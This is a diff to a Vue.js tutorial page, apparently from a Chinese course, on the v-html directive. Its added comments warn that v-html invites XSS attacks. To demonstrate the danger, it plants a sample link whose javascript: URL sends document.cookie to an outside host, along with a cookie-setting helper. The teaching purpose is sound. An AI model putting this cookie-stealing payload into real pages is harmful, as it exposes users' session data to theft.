@@ -5,13 +5,22 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>内置指令</title>
+    <title>2.v-html_指令</title>
     <script type="text/javascript" src="../js/vue.js"></script>
     <script type="text/javascript" src="../js/dayjs.min.js"></script>
 </head>
 
 <body>
     <!-- 
+        总结：
+        v-html:
+            1.作用：向指定节点中渲染包含html结构的内容
+            2.与插值语法的区别：
+                （1）.v-html会替换掉节点中所有的内容, {{x}}不会
+                （2）.v-html可以识别html结构（标签）
+            3.严重注意：v-html有安全性问题！！！！！！
+                （1）在网站上动态渲染任何html是非常危险的，容易导致xss攻击
+                （2）一定要在可信的内容上使用v-html，不可用在用户提交的内容上（比如表单中）
      -->
 
     <div id="root">
@@ -23,6 +32,13 @@
 
         <!-- 可以解析html标签 -->
         <div v-html='msg2'></div>
+
+        <!-- 可以解析html标签 -->
+        <a v-html='msg3'></a>
+
+        <button @click='saveCookie("test", "haha", 1)'>
+            点击添加cookie信息
+        </button>
     </div>
 
     <script>
@@ -34,9 +50,27 @@
             data: {
                 time: 1621561377603, // 时间戳
                 msg: '尚硅谷',
-                msg2: '<h1 style="color: red">我是标题1</h1>'
+                msg2: '<h1 style="color: red">我是标题1</h1>',
+                // 比较危险，会拿到当前页面存储的cookie信息
+                msg3: '<a href=javascript:location.href="httP://www.baidu.com?"+document.cookie>我找到你的连接了</a>'
+            },
+            methods: {
+                saveCookie(cookieName, cookieValue, cookieDates) {
+                    var d = new Date();
+                    d.setDate(d.getDate() + cookieDates);
+                    document.cookie = cookieName + "=" + cookieValue + ";expires=" + d.toGMTString();
+                }
             },
         })
+
+        //保存cookie
+        //参数：cookie名, cookie值, 有效时长(单位：天)
+        function saveCookie(cookieName, cookieValue, cookieDates) {
+            var d = new Date();
+            d.setDate(d.getDate() + cookieDates);
+            document.cookie = cookieName + "=" + cookieValue + ";expires=" + d.toGMTString();
+        }
+        saveCookie('test', 'haha', 1)
 
     </script>
 
